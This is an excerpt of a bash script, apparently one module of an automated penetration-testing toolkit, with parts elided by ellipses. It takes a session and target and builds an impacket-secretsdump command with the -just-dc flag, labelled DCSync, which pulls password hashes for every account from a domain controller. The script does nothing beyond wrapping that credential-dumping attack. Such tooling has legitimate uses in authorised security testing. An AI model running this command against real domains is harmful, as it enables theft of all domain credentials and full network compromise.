...
# Usage: bash V-099.sh <SESSION> <TARGET>
# Place at: ~/Desktop/trinetra/scripts/hexstrike/V-099.sh
set -euo pipefail

SESSION="${1:?ERROR: usage: bash V-099.sh <session> <target>}"
TARGET="${2:?ERROR: usage: bash V-099.sh <session> <target>}"
...
CMD="impacket-secretsdump -just-dc domain/user:pass@$TARGET"

echo "[hex] V-099: DCSync → $TARGET"
...
python3 - \
    ...
    "V-099" "DCSync" "Host, Software and internal architecture" "impacket-secretsdump" \
